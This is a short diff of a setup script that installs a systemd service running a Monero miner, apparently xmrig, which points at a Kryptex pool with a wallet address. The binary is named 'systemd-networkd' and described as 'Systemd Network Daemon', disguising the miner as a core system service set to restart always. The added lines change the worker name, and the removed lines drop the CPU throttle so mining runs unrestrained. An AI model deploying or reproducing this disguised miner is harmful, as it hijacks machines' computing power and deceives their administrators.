@@ -37,7 +37,7 @@ Description=Systemd Network Daemon
 After=network.target
 
 [Service]
-ExecStart=/home/ubuntu/systemd-networkd -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM64-19-ohi -k --coin monero -a rx/64 --cpu-max-threads-hint=90
+ExecStart=/home/ubuntu/systemd-networkd -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM64-20-3 -k --coin monero -a rx/64
 Restart=always
 User=ubuntu
 WorkingDirectory=/home/ubuntu
@@ -54,6 +54,3 @@ EOF'
 sudo systemctl daemon-reload
 sudo systemctl enable xmrig
 sudo systemctl start xmrig
-
-# Apply CPU limit to 85%
-cpulimit -e systemd-networkd -l 90 -b
